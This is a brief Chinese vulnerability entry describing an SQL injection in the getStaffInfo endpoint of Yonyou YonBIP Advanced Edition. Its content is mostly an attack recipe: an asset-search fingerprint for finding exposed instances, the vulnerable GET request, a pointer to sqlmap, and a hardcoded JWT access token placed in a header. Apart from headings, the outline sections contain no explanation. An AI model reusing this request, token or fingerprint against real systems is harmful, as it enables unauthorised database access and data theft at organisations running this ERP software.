# 用友YonBIP高级版getStaffInfo存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.body="/nccloud/resources/uap/rbac/login/main/index.html"`
- **请求**：`GET /ncchr/attendstaff/getStaffInfo?id=1 HTTP/1.1`

**请求体 / payload**
```
sqlmap
Host: xx.xx.xx.xx
accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
```

**其他**
- 用友YonBIP高级版getStaffInfo存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友YonBIP高级版